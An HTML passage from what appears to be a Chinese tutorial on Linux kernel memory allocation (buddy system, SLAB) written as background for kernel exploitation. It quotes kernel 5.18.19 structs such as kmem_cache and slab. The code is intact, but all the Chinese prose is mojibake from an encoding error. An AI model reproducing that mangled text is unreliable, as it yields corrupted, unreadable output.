<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ä¼™ä¼´ç³»ç»Ÿçš„ä¸€ä¸ªå—ï¼Œæè¿°1,2,4,8,16,32,64,128,256,512æˆ–1024ä¸ªè¿ç»­é¡µæ¡†çš„å— */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line">    <span class="comment">/* æŒ‡å‘è¿™ä¸ªå—ä¸­æ‰€æœ‰ç©ºé—²å°å—çš„ç¬¬ä¸€ä¸ªé¡µæè¿°ç¬¦ï¼Œè¿™äº›å°å—ä¼šæŒ‰ç…§MIGRATE_TYPESç±»å‹å­˜æ”¾åœ¨ä¸åŒæŒ‡é’ˆé‡Œ */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">free_list</span>[<span class="title">MIGRATE_TYPES</span>];</span></span><br><span class="line">    <span class="comment">/* ç©ºé—²å°å—çš„ä¸ªæ•° */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        nr_free;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><font color=red><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¼™ä¼´ç³»ç»Ÿå¹¶ä¸æ˜¯å†…æ ¸å†…å­˜åˆ†é…ç³»ç»Ÿä¸­æœ€ä¸Šå±‚çš„ç»“æ„ï¼Œåœ¨å…¶ä¸Šè¿˜æœ‰å…¶ä»–çš„ç»“æ„ï¼Œä½†åœ¨Kernel pwnä¸­æˆ‘ä»¬å¯¹æ›´ä¸ºä¸Šå±‚çš„ç»“æ„æ¥è§¦è¾ƒå°‘ï¼Œå› æ­¤è¿™é‡Œåªä»‹ç»åˆ°ä¼™ä¼´ç³»ç»Ÿã€‚</strong></font></p>
<p>ä¸Šå›¾çš„<code>free_area</code>è¡¨ç¤ºä¸€ç³»åˆ—é¡µçš„é“¾è¡¨çš„æ•°ç»„ã€‚è€Œåœ¨Linuxç³»ç»Ÿå†…æ ¸ä¸­ï¼Œä¸€å…±æœ‰11ä¸ªè¿™æ ·çš„<code>free_area</code>ï¼Œåˆ†åˆ«ä¿å­˜æ‰€æœ‰å¤§å°ä¸º1,2,4,8,16,32,64,128,256,512,1024ä¸ªé¡µå¤§å°çš„å†…å­˜ç©ºé—´ï¼ˆè¿™äº›ç©ºé—´éƒ½æ˜¯è¿ç»­çš„ï¼‰ï¼Œåœ¨<code>free_area</code>ä¸­ï¼Œ<code>free_list</code>æ˜¯ä¸€ç³»åˆ—è¿™æ ·çš„å†…å­˜ç©ºé—´ç»„æˆçš„é“¾è¡¨çš„æ•°ç»„ï¼Œå†…å«å¤šä¸ªé“¾è¡¨ï¼Œè¿™äº›é“¾è¡¨ä¸­çš„å†…å­˜ç©ºé—´å¤§å°ç›¸åŒï¼Œä½†å±æ€§ä¸åŒï¼Œå¯¹äº<code>MIGRATE_TYPES</code>çš„å®šä¹‰å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">migratetype</span> &#123;</span></span><br><span class="line">	MIGRATE_UNMOVABLE,</span><br><span class="line">	MIGRATE_MOVABLE,</span><br><span class="line">	MIGRATE_RECLAIMABLE,</span><br><span class="line">	MIGRATE_PCPTYPES,	<span class="comment">/* the number of types on the pcp lists */</span></span><br><span class="line">	MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * MIGRATE_CMA migration type is designed to mimic the way</span></span><br><span class="line"><span class="comment">	 * ZONE_MOVABLE works.  Only movable pages can be allocated</span></span><br><span class="line"><span class="comment">	 * from MIGRATE_CMA pageblocks and page allocator never</span></span><br><span class="line"><span class="comment">	 * implicitly change migration type of MIGRATE_CMA pageblock.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * The way to use it is to change migratetype of a range of</span></span><br><span class="line"><span class="comment">	 * pageblocks to MIGRATE_CMA which can be done by</span></span><br><span class="line"><span class="comment">	 * __free_pageblock_cma() function.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	MIGRATE_CMA,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">	MIGRATE_ISOLATE,	<span class="comment">/* can&#x27;t allocate from here */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	MIGRATE_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå®šä¹‰äº†é“¾è¡¨ä¸­å†…å­˜å—çš„å±æ€§ï¼š</p>
<blockquote>
<p>linuxä¸ºäº†é˜²æ­¢å†…å­˜ä¸­äº§ç”Ÿè¿‡å¤šçš„ç¢ç‰‡ï¼Œä¸€èˆ¬æŠŠé¡µçš„ç±»å‹åˆ†ä¸ºä¸‰ç§ï¼š<br />
ä¸å¯ç§»åŠ¨é¡µï¼šåœ¨å†…å­˜ä¸­æœ‰å›ºå®šä½ç½®ï¼Œä¸èƒ½ç§»åŠ¨åˆ°å…¶ä»–åœ°æ–¹ã€‚å†…æ ¸ä¸­ä½¿ç”¨çš„é¡µå¤§éƒ¨åˆ†æ˜¯å±äºè¿™ç§ç±»å‹ã€‚<br />
å¯å›æ”¶é¡µï¼šä¸èƒ½ç›´æ¥ç§»åŠ¨ï¼Œä½†å¯ä»¥åˆ é™¤ï¼Œé¡µä¸­çš„å†…å®¹å¯ä»¥ä»æŸäº›æºä¸­é‡æ–°ç”Ÿæˆã€‚ä¾‹å¦‚ï¼Œé¡µå†…å®¹æ˜¯æ˜ å°„åˆ°æ–‡ä»¶æ•°æ®çš„é¡µå°±å±äºè¿™ç§ç±»å‹ã€‚å¯¹äºè¿™ç§ç±»å‹ï¼Œåœ¨å†…å­˜çŸ­ç¼º(åˆ†é…å¤±è´¥)æ—¶ï¼Œä¼šå‘èµ·å†…å­˜å›æ”¶ï¼Œå°†è¿™ç±»å‹é¡µè¿›è¡Œå›å†™é‡Šæ”¾ã€‚<br />
å¯ç§»åŠ¨é¡µï¼šå¯éšæ„ç§»åŠ¨ï¼Œç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹ä½¿ç”¨çš„æ²¡æœ‰æ˜ å°„å…·ä½“ç£ç›˜æ–‡ä»¶çš„é¡µå°±å±äºè¿™ç§ç±»å‹(æ¯”å¦‚å †ã€æ ˆã€shmemå…±äº«å†…å­˜ã€åŒ¿åmmapå…±äº«å†…å­˜)ï¼Œå®ƒä»¬æ˜¯é€šè¿‡è¿›ç¨‹é¡µè¡¨æ˜ å°„çš„ï¼ŒæŠŠè¿™äº›é¡µå¤åˆ¶åˆ°æ–°ä½ç½®æ—¶ï¼Œåªè¦æ›´æ–°è¿›ç¨‹é¡µè¡¨å°±å¯ä»¥äº†ã€‚ä¸€èˆ¬è¿™äº›é¡µæ˜¯ä»é«˜ç«¯å†…å­˜ç®¡ç†åŒºè·å–ã€‚</p>
</blockquote>
<p>ä¸Šé¢çš„æ¯ä¸€ä¸ªé“¾è¡¨ä¸­ä¿å­˜çš„æ‰€æœ‰å†…å­˜å—çš„å±æ€§éƒ½æ˜¯ä¸€æ ·çš„ã€‚å› æ­¤æ€»çš„æ¥çœ‹ï¼Œä¼™ä¼´ç³»ç»Ÿå¯ä»¥è¡¨ç¤ºä¸ºä¸‹å›¾æ‰€ç¤ºçš„ç»“æ„ï¼š</p>
<p><img src="1.png" alt="" /><br />
å…¶ä¸­æšä¸¾ç±»å‹å…·ä½“çš„å«ä¹‰æˆ‘ä»¬åªéœ€è¦äº†è§£å³å¯ï¼Œåœ¨Kernel pwnä¸­æˆ‘ä»¬åº”è¯¥åº”å¯¹çš„æœ€å¤šçš„è¿˜æ˜¯SLABå’ŒSLUBç³»ç»Ÿã€‚è™½ç„¶SLABç³»ç»Ÿæ­£é€æ¸è¢«SLUBæ›¿æ¢ï¼Œä½†è¿˜æ˜¯æœ‰å¿…è¦è¿›è¡Œäº†è§£ã€‚</p>
<h1 id="2-slabç³»ç»Ÿä»‹ç»"><a class="markdownIt-Anchor" href="#2-slabç³»ç»Ÿä»‹ç»"></a> 2. SLABç³»ç»Ÿä»‹ç»</h1>
<p>SLABåˆ†é…å™¨å»ºç«‹åœ¨ä¼™ä¼´ç³»ç»ŸåŸºç¡€ä¸Šï¼Œç”±äºå‚è€ƒèµ„æ–™å¹´ä»£è¾ƒä¸ºä¹…è¿œï¼Œéƒ¨åˆ†æºç ä¸æœ€è¿‘çš„Linuxå†…æ ¸æºç å·®è·è¾ƒå¤§ï¼Œå› æ­¤ä¸åšè§£é‡Šï¼Œä½†å½±å“ä¸å¤§ã€‚</p>
<p>åœ¨SLABä¸­ï¼Œæˆ‘ä»¬å°†å¯åˆ†é…çš„å†…å­˜å—ç§°ä¹‹ä¸º<font color=red><strong>å¯¹è±¡</strong></font>ï¼Œä¸€ä¸ªåˆ†é…å™¨ç”±ç»“æ„ä½“<code>kmem_cache</code>æè¿°ï¼Œç»“æ„å¦‚ä¸‹ï¼ˆé€‰è‡ªLinux 5.18.19ç‰ˆæœ¬å†…æ ¸ï¼‰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> __<span class="title">percpu</span> *<span class="title">cpu_cache</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 1) Cache tunables. Protected by slab_mutex */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> batchcount;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> limit;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> shared;</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">reciprocal_value</span> <span class="title">reciprocal_buffer_size</span>;</span></span><br><span class="line"><span class="comment">/* 2) touched by every alloc &amp; free from the backend */</span></span><br><span class="line"></span><br><span class="line">	<span class="type">slab_flags_t</span> flags;		<span class="comment">/* constant flags */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> num;		<span class="comment">/* # of objs per slab */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 3) cache_grow/shrink */</span></span><br><span class="line">	<span class="comment">/* order of pgs per slab (2^n) */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> gfporder;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* force GFP flags, e.g. GFP_DMA */</span></span><br><span class="line">	<span class="type">gfp_t</span> allocflags;</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> colour;			<span class="comment">/* cache colouring range */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> colour_off;	<span class="comment">/* colour offset */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">freelist_cache</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> freelist_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* constructor func */</span></span><br><span class="line">	<span class="type">void</span> (*ctor)(<span class="type">void</span> *obj);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 4) cache creation/removal */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">	<span class="type">int</span> refcount;</span><br><span class="line">	<span class="type">int</span> object_size;</span><br><span class="line">	<span class="type">int</span> align;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 5) statistics */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_SLAB</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> num_active;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> num_allocations;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> high_mark;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> grown;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> reaped;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> errors;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> max_freeable;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> node_allocs;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> node_frees;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> node_overflow;</span><br><span class="line">	<span class="type">atomic_t</span> allochit;</span><br><span class="line">	<span class="type">atomic_t</span> allocmiss;</span><br><span class="line">	<span class="type">atomic_t</span> freehit;</span><br><span class="line">	<span class="type">atomic_t</span> freemiss;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If debugging is enabled, then the allocator can add additional</span></span><br><span class="line"><span class="comment">	 * fields and/or padding to every object. &#x27;size&#x27; contains the total</span></span><br><span class="line"><span class="comment">	 * object size including these internal fields, while &#x27;obj_offset&#x27;</span></span><br><span class="line"><span class="comment">	 * and &#x27;object_size&#x27; contain the offset to the user object and its</span></span><br><span class="line"><span class="comment">	 * size.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span> obj_offset;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_DEBUG_SLAB */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> useroffset;	<span class="comment">/* Usercopy region offset */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> usersize;		<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­<code>kmem_cache_node *node[MAX_NUMNODES]</code>ä¸­å°±ä¿å­˜æœ‰SLABåˆ†é…å™¨ä¸­çš„ä¸€äº›æ ¸å¿ƒç»“æ„ï¼Œè¿™é‡Œçš„<code>MAX_NUMNODES</code>åœ¨x86-64æ¶æ„ä¸‹çš„å€¼ä¸º64ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line">	<span class="type">spinlock_t</span> list_lock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_partial</span>;</span>	<span class="comment">/* partial list first, better asm code */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_full</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_free</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> total_slabs;	<span class="comment">/* length of all slab lists */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> free_slabs;	<span class="comment">/* length of free slab list only */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> free_objects;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> free_limit;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> colour_next;	<span class="comment">/* Per-node cache coloring */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">shared</span>;</span>	<span class="comment">/* shared per node */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">alien_cache</span> **<span class="title">alien</span>;</span>	<span class="comment">/* on other nodes */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> next_reap;	<span class="comment">/* updated without locking */</span></span><br><span class="line">	<span class="type">int</span> free_touched;		<span class="comment">/* updated without locking */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> nr_partial;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="type">atomic_long_t</span> nr_slabs;</span><br><span class="line">	<span class="type">atomic_long_t</span> total_objects;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">full</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„<code>list_head</code>é‡Œé¢åªä¿å­˜äº†ä¸¤ä¸ªå€¼ï¼š<code>next</code>æŒ‡é’ˆå’Œ<code>prev</code>æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯åŒå‘é“¾è¡¨çš„ç»å…¸ç»“æ„ã€‚è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰ä¸‰ä¸ªåŒå‘é“¾è¡¨ï¼š<code>slabs_partial</code>ã€<code>slabs_full</code>ã€<code>slabs_free</code>ï¼Œåˆ†åˆ«ä¿å­˜çš„æ˜¯<strong>å†…éƒ¨æœ‰éƒ¨åˆ†å¯¹è±¡è¢«åˆ†é…çš„SLABã€å†…éƒ¨æ‰€æœ‰å¯¹è±¡éƒ½è¢«åˆ†é…çš„SLABã€å†…éƒ¨æ‰€æœ‰å¯¹è±¡éƒ½ç©ºé—²çš„SLAB</strong>ã€‚è¿™ä¸‰ä¸ªé“¾è¡¨ä¸­çš„slabå¯ä»¥äº’ç›¸è½¬åŒ–ï¼Œå¦‚å‘ä¸€ä¸ªæ‰€æœ‰å¯¹è±¡éƒ½ç©ºé—²çš„SLABä¸­ç”³è¯·ç©ºé—´æˆåŠŸåï¼Œè¿™ä¸ªSLABå°±ä¼šä»<code>slabs_free</code>ç§»åŠ¨åˆ°<code>slabs_partial</code>ã€‚</p>
<p>è™½ç„¶æ–‡ç« å¼€å¤´å‚è€ƒçš„æ–‡ç« å·²ç»åœ¨ä¸€å®šç¨‹åº¦ä¸Šè¿‡æ—¶ï¼Œä½†å…¶ä¸­å…³äºSLABåˆ†é…å™¨çš„å®ç°åŸç†å’Œæ€æƒ³å´ä¸€ç›´æ²¿ç”¨è‡³ä»Šã€‚åœ¨5.18.19ç‰ˆæœ¬çš„<code>page</code>ç»“æ„ä½“ä¸­ï¼Œå·²ç»æ‰¾ä¸åˆ°å‚è€ƒæ–‡ç« ä¸­çš„ä¸€äº›å…³é”®ç»“æ„ï¼Œä¸è¿‡è¿™ä¸å½±å“æˆ‘ä»¬å¯¹SLABæœ¬èº«çš„åˆ†æã€‚</p>
<p>ä¸‹é¢æ˜¯5.18.19ç‰ˆæœ¬å†…æ ¸çš„<code>slab</code>ç»“æ„ä½“å£°æ˜ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> __page_flags;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_SLAB)</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line">	<span class="type">void</span> *freelist;	<span class="comment">/* array of free object indexes */</span></span><br><span class="line">	<span class="type">void</span> *s_mem;	<span class="comment">/* first object */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> active;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SLUB)</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">next</span>;</span></span><br><span class="line">			<span class="type">int</span> slabs;	<span class="comment">/* Nr of slabs left */</span></span><br><span class="line">		&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line">	<span class="comment">/* Double-word boundary */</span></span><br><span class="line">	<span class="type">void</span> *freelist;		<span class="comment">/* first free object */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line">			<span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line">			<span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> __unused;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SLOB)</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line">	<span class="type">void</span> *__unused_1;</span><br><span class="line">	<span class="type">void</span> *freelist;		<span class="comment">/* first free block */</span></span><br><span class="line">	<span class="type">long</span> units;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> __unused_2;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">error</span> <span class="string">&quot;Unexpected slab allocator configured&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">atomic_t</span> __page_refcount;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> memcg_data;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
